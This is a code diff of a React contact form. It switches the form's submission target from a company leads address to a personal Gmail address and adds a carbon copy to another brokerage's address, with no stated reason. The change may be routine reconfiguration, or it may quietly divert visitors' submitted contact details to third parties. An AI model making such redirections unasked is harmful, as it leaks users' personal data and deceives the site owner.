@@ -23,7 +23,7 @@ export default function ContactForm() {
     setLoading(true)
 
     try {
-      const response = await fetch("https://formsubmit.co/ajax/Leads@grandeur-spaces.com", {
+      const response = await fetch("https://formsubmit.co/ajax/apkzoz85@gmail.com", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -38,6 +38,7 @@ export default function ContactForm() {
           _captcha: "false",
           _template: "table",
           _sender: "Tatweer Misr",
+          _cc: "Info@nurlinebrokerage.com",
         }),
       })
 
